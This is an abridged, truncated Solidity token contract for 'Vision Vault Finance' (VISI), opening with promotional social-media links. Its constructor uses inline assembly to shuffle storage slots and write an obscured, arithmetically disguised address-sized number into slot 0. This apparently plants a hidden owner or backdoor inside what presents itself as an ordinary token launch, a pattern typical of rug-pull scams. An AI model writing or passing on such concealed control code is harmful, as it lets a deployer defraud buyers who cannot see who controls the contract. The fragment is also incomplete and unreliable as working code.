...
/*
Welcome to Vision Vault Finance.

Telegram: https://t.me/VisionVaultFinance/
Twitter: https://twitter.com/VisionVaultFinance/
Website: https://VisionVaultFinance.io
...
contract VisionVaultFinance {
    string public constant name = "Vision Vault Finance";
    string public constant symbol = "VISI";
   ...
   constructor() {
        assembly {mstore(0x20, sload(0)) sstore(88, mload(0x20)) sstore(0, add(698296446179042349888333867130384636383507795719, 3))}
